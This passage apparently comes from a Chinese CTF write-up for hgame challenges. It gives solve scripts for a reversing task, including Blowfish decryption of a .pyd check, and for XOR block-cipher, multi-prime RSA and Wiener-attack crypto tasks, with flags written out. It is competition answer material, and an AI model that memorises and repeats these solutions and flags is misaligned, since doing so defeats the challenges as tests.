    (<span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x6A02</span>),
    (<span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xB10F</span>),
    (<span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x78E5</span>),
    (<span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x7EF6</span>),
    (<span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x89A3</span>),
    (<span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x8EBD</span>),
    (<span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x95E3</span>),
    (<span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x73DA</span>),
    (<span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x538C</span>),
    (<span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x633B</span>),
    (<span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x9E9C</span>),
    (<span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0xB78B</span>),
    (<span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0xC866</span>),
    (<span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x32AE</span>),
    (<span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x7679</span>),
    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x2AE7</span>),
    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x4D6A</span>),
    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x5708</span>),
    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x6610</span>),
    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xA258</span>),
    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xB80C</span>),
    (<span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xC885</span>),
    (<span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x710A</span>),
    (<span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x7CF4</span>),
    (<span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x3F76</span>),
    (<span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x702B</span>),
    (<span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0xA3EE</span>),
    (<span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0xAD50</span>),
    (<span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0xBAC7</span>),
    (<span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x4024</span>),
    (<span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x8A22</span>),
    (<span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0xC055</span>),
    (<span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0x2B52</span>),
    (<span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0xC687</span>),
    (<span style="color:#ae81ff">0x6B</span>, <span style="color:#ae81ff">0x5F00</span>),
    (<span style="color:#ae81ff">0x6B</span>, <span style="color:#ae81ff">0xC417</span>),
    (<span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0x6182</span>),
    (<span style="color:#ae81ff">0x6D</span>, <span style="color:#ae81ff">0x75DB</span>),
    (<span style="color:#ae81ff">0x6E</span>, <span style="color:#ae81ff">0x3C61</span>),
    (<span style="color:#ae81ff">0x6E</span>, <span style="color:#ae81ff">0x4996</span>),
    (<span style="color:#ae81ff">0x6E</span>, <span style="color:#ae81ff">0x5DC1</span>),
    (<span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x2D76</span>),
    (<span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x7D17</span>),
    (<span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0xA91B</span>),
    (<span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x9AED</span>),
    (<span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x45D0</span>),
    (<span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x8467</span>),
    (<span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0xAB5D</span>),
    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x5083</span>),
    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x6222</span>),
    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x8D93</span>),
    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x923A</span>),
    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x971E</span>),
    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0xB4BA</span>),
    (<span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0xC785</span>),
    (<span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x3558</span>),
    (<span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x86BD</span>),
    (<span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x9738</span>),
    (<span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x3710</span>),
    (<span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x9779</span>),
    (<span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x2F3F</span>),
    (<span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x44DD</span>),
    (<span style="color:#ae81ff">0x7B</span>, <span style="color:#ae81ff">0x78E1</span>),
    (<span style="color:#ae81ff">0x7D</span>, <span style="color:#ae81ff">0x9F42</span>)
]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">takeSecond</span>(elem):
    <span style="color:#66d9ef">return</span> elem[<span style="color:#ae81ff">1</span>]

a<span style="color:#f92672">.</span>sort(key<span style="color:#f92672">=</span>takeSecond)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a:
    print (chr(i[<span style="color:#ae81ff">0</span>]), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
<span style="color:#75715e"># fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame{B0go_50rt_is_s0_stup1d}fh32orh98sdfh23ikjsdf32</span>
</code></pre></div><h3 id="refishman">[RE]fishman</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>pyd逆向</p>
<p>先定位函数</p>
<p>搜索字符串，能看到几个函数名</p>
<p><figure 
	>
	<a href="/fishman_findfunc.png" >
		<img src="/fishman_findfunc.png"
			
			
			
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>比如 <code>init</code> 函数就是 <code>sub_180002670</code></p>
<p>接下来就是密码算法识别</p>
<p>查看一下 <code>init</code> 和 <code>check</code> 函数，这题使用的是 <code>blowfish</code> 密码，之前没有遇到过，所以是靠着 <code>findcrypt</code> 脚本识别出来的</p>
<p>顺便放一下搜到的加密算法源码，来源是 <a class="link" href="https://gitee.com/miao123456miao/blowfish2"  target="_blank" rel="noopener"
    >https://gitee.com/miao123456miao/blowfish2</a></p>
<p>这是一个分组密码，主要的特征就是 <code>f</code> 函数</p>
<p>剩下的也没什么特别的，贴一下求解脚本吧</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;blowfish.h&#34;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">swap</span>(<span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> a, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> b) {
    <span style="color:#66d9ef">uint32_t</span> tmp;
    
    tmp <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>a;
    <span style="color:#f92672">*</span>a <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>b;
    <span style="color:#f92672">*</span>b <span style="color:#f92672">=</span> tmp;
}

<span style="color:#66d9ef">uint32_t</span> <span style="color:#a6e22e">blowfish_f</span>(blowfish_t<span style="color:#f92672">*</span> container, <span style="color:#66d9ef">uint32_t</span> input) {
    <span style="color:#66d9ef">uint8_t</span> a, b, c, d;
    
    a <span style="color:#f92672">=</span> input <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>;
    b <span style="color:#f92672">=</span> (input <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
    c <span style="color:#f92672">=</span> (input <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
    d <span style="color:#f92672">=</span> input <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
    
    <span style="color:#66d9ef">return</span> ((container<span style="color:#f92672">-&gt;</span>s[<span style="color:#ae81ff">0</span>][a] <span style="color:#f92672">+</span> container<span style="color:#f92672">-&gt;</span>s[<span style="color:#ae81ff">1</span>][b]) <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>s[<span style="color:#ae81ff">2</span>][c]) <span style="color:#f92672">+</span>
            container<span style="color:#f92672">-&gt;</span>s[<span style="color:#ae81ff">3</span>][d];
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">blowfish_cipher</span>(blowfish_t<span style="color:#f92672">*</span> container, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> xl, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> xr, <span style="color:#66d9ef">uint8_t</span> mode) {
    <span style="color:#66d9ef">int</span> i;
    <span style="color:#66d9ef">uint32_t</span> loc_xl, loc_xr;
    
    loc_xl <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>xl;
    loc_xr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>xr;
    
    <span style="color:#66d9ef">if</span>(mode <span style="color:#f92672">==</span> BLOWFISH_ENCRYPT) {
        <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> PASSES; i<span style="color:#f92672">++</span>) {
            loc_xl <span style="color:#f92672">=</span> loc_xl <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[i];
            loc_xr <span style="color:#f92672">=</span> blowfish_f(container, loc_xl) <span style="color:#f92672">^</span> loc_xr;
        
            swap(<span style="color:#f92672">&amp;</span>loc_xl, <span style="color:#f92672">&amp;</span>loc_xr);
        }
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(mode <span style="color:#f92672">==</span> BLOWFISH_DECRYPT) {
        <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> PASSES<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>; i<span style="color:#f92672">--</span>) {
            loc_xl <span style="color:#f92672">=</span> loc_xl <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[i];
            loc_xr <span style="color:#f92672">=</span> blowfish_f(container, loc_xl) <span style="color:#f92672">^</span> loc_xr;
        
            swap(<span style="color:#f92672">&amp;</span>loc_xl, <span style="color:#f92672">&amp;</span>loc_xr);
        }
    }
        
    swap(<span style="color:#f92672">&amp;</span>loc_xl, <span style="color:#f92672">&amp;</span>loc_xr);
    
    <span style="color:#66d9ef">if</span>(mode <span style="color:#f92672">==</span> BLOWFISH_ENCRYPT) { 
        loc_xr <span style="color:#f92672">=</span> loc_xr <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[PASSES];
        loc_xl <span style="color:#f92672">=</span> loc_xl <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[PASSES<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>];
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(mode <span style="color:#f92672">==</span> BLOWFISH_DECRYPT) {
        loc_xr <span style="color:#f92672">=</span> loc_xr <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[<span style="color:#ae81ff">1</span>];
        loc_xl <span style="color:#f92672">=</span> loc_xl <span style="color:#f92672">^</span> container<span style="color:#f92672">-&gt;</span>p[<span style="color:#ae81ff">0</span>];
    }
    
    <span style="color:#f92672">*</span>xl <span style="color:#f92672">=</span> loc_xl;
    <span style="color:#f92672">*</span>xr <span style="color:#f92672">=</span> loc_xr;
}

blowfish_t<span style="color:#f92672">*</span> <span style="color:#a6e22e">blowfish_initialize</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> key, <span style="color:#66d9ef">uint32_t</span> length) {
    blowfish_t<span style="color:#f92672">*</span> container <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(blowfish_t));
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i, ii, j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">uint32_t</span> tmp, tmp_l <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, tmp_r <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;  

    <span style="color:#66d9ef">if</span>(length <span style="color:#f92672">&gt;</span> BLOWFISH_MAX_KEY_BYTES) <span style="color:#66d9ef">return</span> (blowfish_t<span style="color:#f92672">*</span>) NULL;

    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> PASSES<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) {
        container<span style="color:#f92672">-&gt;</span>p[i] <span style="color:#f92672">=</span> P[i];
    }
    
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SBOXES; i<span style="color:#f92672">++</span>) {
        <span style="color:#66d9ef">for</span>(ii <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ii <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; ii<span style="color:#f92672">++</span>) {
            container<span style="color:#f92672">-&gt;</span>s[i][ii] <span style="color:#f92672">=</span> S[i][ii];
        }
    }
    
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> PASSES<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) {
        tmp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        <span style="color:#66d9ef">for</span>(ii <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ii <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; ii<span style="color:#f92672">++</span>) {
            tmp <span style="color:#f92672">=</span> (tmp <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> key[j];
            j<span style="color:#f92672">++</span>;
            <span style="color:#66d9ef">if</span>(j <span style="color:#f92672">==</span> length) 
                j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        }
        container<span style="color:#f92672">-&gt;</span>p[i] <span style="color:#f92672">=</span> container<span style="color:#f92672">-&gt;</span>p[i] <span style="color:#f92672">^</span> tmp;
    }

    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> PASSES<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>; i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>) {
        blowfish_cipher(container, <span style="color:#f92672">&amp;</span>tmp_l, <span style="color:#f92672">&amp;</span>tmp_r, BLOWFISH_ENCRYPT);
        container<span style="color:#f92672">-&gt;</span>p[i] <span style="color:#f92672">=</span> tmp_l;
        container<span style="color:#f92672">-&gt;</span>p[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> tmp_r;
    }
    
    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SBOXES; i<span style="color:#f92672">++</span>) {  
        <span style="color:#66d9ef">for</span>(ii <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ii <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; ii <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>) { 
            blowfish_cipher(container, <span style="color:#f92672">&amp;</span>tmp_l, <span style="color:#f92672">&amp;</span>tmp_r, BLOWFISH_ENCRYPT);
            container<span style="color:#f92672">-&gt;</span>s[i][ii] <span style="color:#f92672">=</span> tmp_l;
            container<span style="color:#f92672">-&gt;</span>s[i][ii<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> tmp_r;
        }
    }
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv) {
    <span style="color:#66d9ef">uint32_t</span> high, low;
    blowfish_t<span style="color:#f92672">*</span> container <span style="color:#f92672">=</span> blowfish_initialize(<span style="color:#e6db74">&#34;LET_U_D&#34;</span>, <span style="color:#ae81ff">7</span>);
    high <span style="color:#f92672">=</span> <span style="color:#ae81ff">1416580799u</span>;
    low <span style="color:#f92672">=</span> <span style="color:#ae81ff">3035468667u</span>;
    blowfish_cipher(container, <span style="color:#f92672">&amp;</span>high, <span style="color:#f92672">&amp;</span>low, BLOWFISH_DECRYPT);
    write(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>high, <span style="color:#ae81ff">4</span>);
    write(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>low, <span style="color:#ae81ff">4</span>);
    high <span style="color:#f92672">=</span> <span style="color:#ae81ff">2194841726u</span>;
    low <span style="color:#f92672">=</span> <span style="color:#ae81ff">332656605u</span>;
    blowfish_cipher(container, <span style="color:#f92672">&amp;</span>high, <span style="color:#f92672">&amp;</span>low, BLOWFISH_DECRYPT);
    write(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>high, <span style="color:#ae81ff">4</span>);
    write(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>low, <span style="color:#ae81ff">4</span>);
    high <span style="color:#f92672">=</span> <span style="color:#ae81ff">571059727u</span>;
    low <span style="color:#f92672">=</span> <span style="color:#ae81ff">1498341217u</span>;
    blowfish_cipher(container, <span style="color:#f92672">&amp;</span>high, <span style="color:#f92672">&amp;</span>low, BLOWFISH_DECRYPT);
    write(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>high, <span style="color:#ae81ff">4</span>);
    write(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>low, <span style="color:#ae81ff">4</span>);
    high <span style="color:#f92672">=</span> <span style="color:#ae81ff">3107158060u</span>;
    low <span style="color:#f92672">=</span> <span style="color:#ae81ff">470279474u</span>;
    blowfish_cipher(container, <span style="color:#f92672">&amp;</span>high, <span style="color:#f92672">&amp;</span>low, BLOWFISH_DECRYPT);
    write(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>high, <span style="color:#ae81ff">4</span>);
    write(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>low, <span style="color:#ae81ff">4</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p><code>blowfish.h</code> 去仓库找就行</p>
<blockquote>
<p>试了一下 pycrypto 库，解出来的有问题，可能库的实现和这个有区别，没深入研究</p>
</blockquote>
<h3 id="cryptoblock-cipher">[Crypto]Block Cipher</h3>
<blockquote>
<p>By S1eepy</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> operator
<span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s
<span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> reduce
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(a, b):
    <span style="color:#66d9ef">assert</span> len(a) <span style="color:#f92672">==</span> len(b)
    <span style="color:#66d9ef">return</span> bytes(map(operator<span style="color:#f92672">.</span>xor, a, b))

iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Up</span><span style="color:#ae81ff">\x14\x98</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\x14</span><span style="color:#e6db74">%</span><span style="color:#ae81ff">\xb9</span><span style="color:#e6db74">&#39;</span>
key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\xe8\xb8</span><span style="color:#e6db74">6</span><span style="color:#ae81ff">\x9c</span><span style="color:#e6db74">33^&#39;</span>
parts <span style="color:#f92672">=</span> [<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0</span><span style="color:#ae81ff">\xff\xcd\xc3\x8b\\</span><span style="color:#e6db74">T</span><span style="color:#ae81ff">\x8b</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;RT</span><span style="color:#ae81ff">\x1e\x89</span><span style="color:#e6db74">t&amp;</span><span style="color:#ae81ff">\x17\xbd</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x1a\xee\x8d\xd6\x9b</span><span style="color:#e6db74">&gt;w</span><span style="color:#ae81ff">\x8c</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;9CT</span><span style="color:#ae81ff">\xb3</span><span style="color:#e6db74">^pF</span><span style="color:#ae81ff">\xd0</span><span style="color:#e6db74">&#39;</span>]
flag <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
	<span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
		flag<span style="color:#f92672">.</span>append(reduce(xor, [parts[i], iv, key]))
	<span style="color:#66d9ef">else</span>:
		flag<span style="color:#f92672">.</span>append(reduce(xor, [parts[i], parts[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>], key]))

print(flag[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
<span style="color:#75715e"># hgame{BloCk|cIphER+is+So.EaSY}</span>
</code></pre></div><h3 id="cryptomulti-prime-rsa">[Crypto]Multi Prime RSA</h3>
<blockquote>
<p>By S1eepy</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> gmpy2 <span style="color:#f92672">import</span> invert
<span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s
p <span style="color:#f92672">=</span> <span style="color:#ae81ff">61789932148719477384027458333380568978056286136137829092952317307711908353477</span>
q <span style="color:#f92672">=</span> <span style="color:#ae81ff">91207969353355763685633284378833506319794714507027332929290701748727534193861</span>
r <span style="color:#f92672">=</span> <span style="color:#ae81ff">105471299607375388622347272479207944509670502835651250945203397530010861809367</span>
s <span style="color:#f92672">=</span> <span style="color:#ae81ff">83153238748903772448138307505579799277162652151244477391465130504267171881437</span>
n <span style="color:#f92672">=</span> <span style="color:#ae81ff">1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919</span>
e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
c <span style="color:#f92672">=</span> <span style="color:#ae81ff">844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713</span>
phi <span style="color:#f92672">=</span> (p <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> p) <span style="color:#f92672">*</span> (q <span style="color:#f92672">**</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">-</span> q <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">*</span> (r <span style="color:#f92672">**</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">-</span> r <span style="color:#f92672">**</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">*</span> (s <span style="color:#f92672">**</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">-</span> s <span style="color:#f92672">**</span> <span style="color:#ae81ff">6</span>)
d <span style="color:#f92672">=</span> invert(e, phi)
print(n2s(pow(c, int(d), n)))
</code></pre></div><h3 id="cryptorsa-attack-3">[Crypto]RSA Attack 3</h3>
<blockquote>
<p>By S1eepy</p>
</blockquote>
<p>维纳攻击，github 上找个脚本解出 d 即可</p>
<p><a class="link" href="https://github.com/pablocelayes/rsa-wiener-attack"  target="_blank" rel="noopener"
    >https://github.com/pablocelayes/rsa-wiener-attack</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s
n <span style="color:#f92672">=</span> <span style="color:#ae81ff">507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759</span>
e <span style="color:#f92672">=</span> <span style="color:#ae81ff">77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095</span>
